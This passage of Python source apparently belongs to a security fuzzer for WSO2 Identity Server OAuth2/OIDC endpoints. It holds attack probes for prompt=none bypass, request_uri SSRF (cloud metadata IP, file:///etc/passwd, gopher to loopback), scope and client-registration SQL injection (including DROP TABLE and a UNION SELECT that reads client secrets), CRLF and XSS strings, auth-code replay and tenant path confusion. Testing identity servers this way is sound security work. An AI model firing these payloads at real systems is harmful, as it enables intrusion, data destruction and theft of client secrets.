        the user session is absent (RFC 6749 §3.1.2.6, OIDC Core §3.1.2.1).
        A successful 302 to callback?code=... here is a CRITICAL bug
        (prompt=none bypass).
        """
        self._ensure_state_pkce()
        params = {
            'response_type': 'code',
            'client_id':     kwargs.get('client_id', self.config.client_id),
            'redirect_uri':  kwargs.get('redirect_uri', self.config.redirect_uri),
            'scope':         kwargs.get('scope', self.config.scope),
            'state':         kwargs.get('state', self.state),
            'nonce':         kwargs.get('nonce', self.nonce),
            'prompt':        kwargs.get('prompt', 'none'),
            'code_challenge': self.code_challenge,
            'code_challenge_method': 'S256',
        }
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        try:
            # Use an isolated session so a pre-existing commonAuthId
            # cookie can't silently satisfy prompt=none.
            iso = requests.Session()
            iso.headers.update(self.session.headers)
            r = iso.get(url, allow_redirects=False, timeout=10, verify=False)
            self._record_sent(url, 'GET')
            self._record_received(r)
            return 'prompt_none', r
        except Exception as e:
            return 'prompt_none_error', self._synthetic_response(500, str(e))

    def wso2_request_uri_ssrf(self, **kwargs) -> Tuple[str, requests.Response]:
        """RFC 9101 request_uri SSRF probe."""
        self._ensure_state_pkce()
        # SSRF surface: try both metadata IPs and loopback variants.
        # WSO2 must refuse to dereference these even with a syntactically
        # valid request_uri.
        candidates = kwargs.get('candidates', [
            'http://169.254.169.254/latest/meta-data/',
            'http://[::1]:9443/oauth2/jwks',
            'http://localhost:9763/carbon/admin/login.jsp',
            'file:///etc/passwd',
            'gopher://127.0.0.1:6300/_dump',
        ])
        probe = kwargs.get('request_uri', random.choice(candidates))
        params = {
            'response_type': 'code',
            'client_id':     kwargs.get('client_id', self.config.client_id),
            'redirect_uri':  kwargs.get('redirect_uri', self.config.redirect_uri),
            'scope':         kwargs.get('scope', self.config.scope),
            'state':         self.state,
            'request_uri':   probe,
        }
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        try:
            r = self.session.get(url, allow_redirects=False, timeout=10,
                                 verify=False)
            self._record_sent(url, 'GET')
            self._record_received(r)
            return 'request_uri_ssrf', r
        except Exception as e:
            return 'request_uri_error', self._synthetic_response(500, str(e))

    def wso2_scope_injection(self, **kwargs) -> Tuple[str, requests.Response]:
        """Scope-parameter edge cases (length, injection, special chars).

        WSO2's ScopeValidator implementations are frequent sources of:
          - Regex DoS (very long / repeated patterns)
          - SQL injection via OIDC scope → underlying JDBCScopeDAO
          - Claim smuggling via openid overloading
        """
        self._ensure_state_pkce()
        payloads = kwargs.get('scope_payloads', [
            'openid profile ' + 'A' * 4096,
            "openid' OR '1'='1",
            'openid\r\nX-Injected: 1',
            'openid ../../../admin',
            'openid\x00profile',
            'openid profile email ' + ' '.join(f'scope{i}' for i in range(256)),
        ])
        scope = kwargs.get('scope', random.choice(payloads))
        params = {
            'response_type': 'code',
            'client_id':     kwargs.get('client_id', self.config.client_id),
            'redirect_uri':  kwargs.get('redirect_uri', self.config.redirect_uri),
            'scope':         scope,
            'state':         self.state,
            'nonce':         self.nonce,
            'code_challenge': self.code_challenge,
            'code_challenge_method': 'S256',
        }
        url = f"{self.auth_endpoint}?{urllib.parse.urlencode(params)}"
        try:
            r = self.session.get(url, allow_redirects=False, timeout=10,
                                 verify=False)
            self._record_sent(url, 'GET')
            self._record_received(r)
            self.last_location = r.headers.get('Location', '')
            return 'scope_injection', r
        except Exception as e:
            return 'scope_injection_error', self._synthetic_response(500, str(e))

    def wso2_auth_code_replay(self, **kwargs) -> Tuple[str, requests.Response]:
        """Replay a consumed authorization code against /oauth2/token.

        RFC 6749 §4.1.2 REQUIRES the auth server to reject reuse.  WSO2
        tracks auth codes in AUTHORIZATION_GRANT_CACHE; stale code reuse
        may succeed if the cache TTL is misconfigured or the entry is
        not invalidated on first exchange.  The seed MUST have a prior
        successful TokenExchange for this to be meaningful.
        """
        import base64
        code = kwargs.get('code', self.auth_code)
        if not code:
            return 'auth_code_replay_n/a', self._synthetic_response(
                200, 'no auth code available to replay')

        data = {
            'grant_type':   'authorization_code',
            'code':         code,
            'redirect_uri': self.config.redirect_uri,
            'client_id':    self.config.client_id,
            'code_verifier': self.code_verifier,
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded',
                   'Accept': 'application/json'}
        basic = base64.b64encode(
            f"{self.config.client_id}:{self.config.client_secret}".encode()).decode()
        headers['Authorization'] = f"Basic {basic}"

        try:
            r = self.session.post(self.token_endpoint, data=data,
                                  headers=headers, verify=False, timeout=10)
            self._record_sent(self.token_endpoint, 'POST', data)
            self._record_received(r)
            return 'auth_code_replay', r
        except Exception as e:
            return 'auth_code_replay_error', self._synthetic_response(500, str(e))

    def wso2_tenant_confusion(self, **kwargs) -> Tuple[str, requests.Response]:
        """Probe WSO2 multi-tenant path resolver /t/{tenant}/oauth2/authorize.

        WSO2 supports tenant-qualified endpoints like `/t/foo.com/oauth2/*`.
        The TenantContextRewriteValve + OAuth2Util.getAppInformationByClientId
        combination has historically leaked client metadata across tenants
        (CVE-2022-29548 class).  We probe a set of plausible tenant names,
        including special strings that stress the path normalizer.
        """
        base = self.config.base_url.rstrip('/')
        tenants = kwargs.get('tenants', [
            'carbon.super',
            '..',
            '.',
            'non_existent_tenant',
            '%2e%2e',
            'admin@wso2.com',
            '__proto__',
        ])
        tenant = kwargs.get('tenant', random.choice(tenants))
        url = f"{base}/t/{urllib.parse.quote(tenant, safe='')}/oauth2/authorize"
        params = {
            'response_type': 'code',
            'client_id':     self.config.client_id,
            'redirect_uri':  self.config.redirect_uri,
            'scope':         self.config.scope,
            'state':         self.state,
        }
        full_url = f"{url}?{urllib.parse.urlencode(params)}"
        try:
            r = self.session.get(full_url, allow_redirects=False,
                                 timeout=10, verify=False)
            self._record_sent(full_url, 'GET')
            self._record_received(r)
            return 'tenant_confusion', r
        except Exception as e:
            return 'tenant_confusion_error', self._synthetic_response(500, str(e))

    def wso2_dcr_sql_injection(self, **kwargs) -> Tuple[str, requests.Response]:
        """DCR endpoint client_name SQL-injection probe.

        WSO2's DCR v1.1 stores client_name in IDN_OAUTH_CONSUMER_APPS;
        historical reports indicate inadequate escaping in admin-view
        queries.  A stored-SQLi vector here would be CVSS 9+, so it's
        worth a dedicated attack method separate from generic DCR fuzzing.
        """
        import base64
        payloads = kwargs.get('payloads', [
            "fuzz' OR '1'='1",
            "fuzz'; DROP TABLE IDN_OAUTH_CONSUMER_APPS; --",
            "fuzz\"><script>alert(1)</script>",
            "fuzz\x00admin",
            "fuzz' UNION SELECT client_secret FROM IDN_OAUTH_CONSUMER_APPS --",
        ])
        name = kwargs.get('client_name', random.choice(payloads))
        dcr_url = f"{self.config.base_url.rstrip('/')}/api/identity/oauth2/dcr/v1.1/register"
        payload = {
            "client_name": name,
            "grant_types": ["authorization_code"],
            "redirect_uris": [self.config.redirect_uri],
        }
        headers = self.session.headers.copy()
        headers['Content-Type'] = 'application/json'
        headers['Accept'] = 'application/json'
        admin_user = kwargs.get('admin_user', 'admin')
        admin_pass = kwargs.get('admin_pass', 'admin')
        basic = base64.b64encode(
            f"{admin_user}:{admin_pass}".encode()).decode()
        headers['Authorization'] = f"Basic {basic}"
        try:
            r = self.session.post(dcr_url, json=payload, headers=headers,
                                  verify=False, timeout=10)
            self._record_sent(dcr_url, 'POST', payload)
            self._record_received(r)
            return 'dcr_sql_injection', r
        except Exception as e:
            return 'dcr_sql_injection_error', self._synthetic_response(500, str(e))

    # ── Helpers ────────────────────────────────────────────────────

    def _wso2_reset_state(self, hard: bool = True):
        """Clear WSO2-per-sequence attributes between authorize() calls.

        When hard=True (default for top-of-sequence resets called from
        the fuzzer), every per-sequence attribute and SSO cookie is
        purged.  When hard=False (intra-sequence callers like
        `wso2_authorize` invoked again after a soft retry), the
        sessionDataKey-bearing URL is preserved so the very next
        wso2_login can still find a real form.
        """
        always_clear = ('_wso2_login_failed', '_authorize_response',
                        '_callback_unreachable')
        soft_preserve = ('_wso2_login_url', '_wso2_consent_url',
                         '_wso2_session_data_key', '_authorize_url')

        for attr in always_clear:
            if hasattr(self, attr):
                try:
                    setattr(self, attr,
                            False if attr == '_wso2_login_failed' else None)
                except Exception:
                    pass

        if hard:
            for attr in soft_preserve:
                if hasattr(self, attr):
                    try:
                        setattr(self, attr, None)
                    except Exception:
                        pass
            try:
                for name in ('commonAuthId', 'JSESSIONID',
                             'XSRF-TOKEN', 'opbs',
                             'commonAuthId-' + self.config.client_id):
                    if name in self.session.cookies:
                        self.session.cookies.pop(name, None)
            except Exception:
                pass

    def _wso2_extract_hidden_fields(self, html_body: str) -> Dict[str, str]:
        """Extract hidden form fields from WSO2 HTML pages.

        WSO2 uses specific hidden fields:
          - sessionDataKey: binds the login session to the OAuth request
          - sessionDataKeyConsent: binds the consent session
          - tocommonauth: must be 'true' for /commonauth POST
        """
        if not html_body:
            return {}
        fields = {}
        for m in re.finditer(
                r'<input[^>]+type=["\']hidden["\'][^>]*>'
                r'|<input[^>]+value=["\'][^"\']*["\'][^>]+type=["\']hidden["\'][^>]*>',
                html_body, re.IGNORECASE):
            tag = m.group(0)
            name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
            val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.IGNORECASE)
            if name_m:
                fields[name_m.group(1)] = html.unescape(val_m.group(1)) if val_m else ''

        # Also extract from JS (WSO2 sometimes embeds sessionDataKey in JS)
        if 'sessionDataKey' not in fields:
            sdk_m = re.search(
                r'sessionDataKey["\']?\s*[=:]\s*["\']([^"\']+)["\']',
                html_body, re.IGNORECASE)
            if sdk_m:
                fields['sessionDataKey'] = sdk_m.group(1)

        # Ensure tocommonauth is present
        if 'tocommonauth' not in fields:
            fields['tocommonauth'] = 'true'

        return fields

    def _wso2_looks_like_consent_page(self, body: str) -> bool:
        """Detect WSO2 consent page by HTML markers."""
        if not body:
            return False
        markers = (
            'oauth2_consent',
            'consent',
            'approvedScope',
            'sessionDataKeyConsent',
            'approve',
            'deny',
        )
        body_l = body.lower()
        hits = sum(1 for m in markers if m.lower() in body_l)
        return hits >= 3